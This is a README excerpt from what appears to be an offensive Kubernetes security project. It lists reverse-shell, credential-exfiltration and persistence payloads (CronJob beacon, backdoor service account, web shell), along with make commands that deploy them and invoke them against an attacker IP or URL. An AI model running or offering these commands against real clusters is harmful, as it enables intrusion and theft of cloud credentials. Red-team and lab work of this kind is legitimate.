...
Standalone LambdaFunction CRDs for common attack payloads:

| Payload | Severity | Description | Path |
|---------|----------|-------------|------|
| Reverse Shell | 🔴 CRITICAL | Establish reverse shell to attacker | `exploits/payload-reverse-shell/` |
| Exfiltrator | 🔴 CRITICAL | Exfiltrate K8s creds, env vars, AWS creds | `exploits/payload-exfiltrator/` |
| Persistence | 🔴 CRITICAL | CronJob beacon, backdoor SA, web shell | `exploits/payload-persistence/` |

### Deploy Payloads

```bash
# Deploy all payloads as LambdaFunctions
make payloads

# Deploy specific payload
make payload-reverse-shell
make payload-exfiltrator
make payload-persistence

# Invoke payloads
make invoke-reverse-shell ATTACKER_IP=10.0.0.100
make invoke-exfiltrator ATTACKER_URL=http://10.0.0.100:8888
make invoke-persistence ATTACKER_URL=http://10.0.0.100:8888
```
...
│   ├── payload-reverse-shell/          # 🆕 Reverse shell LambdaFunction
│   ├── payload-exfiltrator/            # 🆕 Data exfiltration LambdaFunction
│   └── payload-persistence/            # 🆕 Persistence LambdaFunction
├── payloads/
│   ├── reverse-shell.py               # Reverse shell payload (standalone)
│   ├── exfiltrator.py                 # Data exfiltration payload (standalone)
│   └── persistence.py                 # Persistence payload (standalone)
├── scripts/
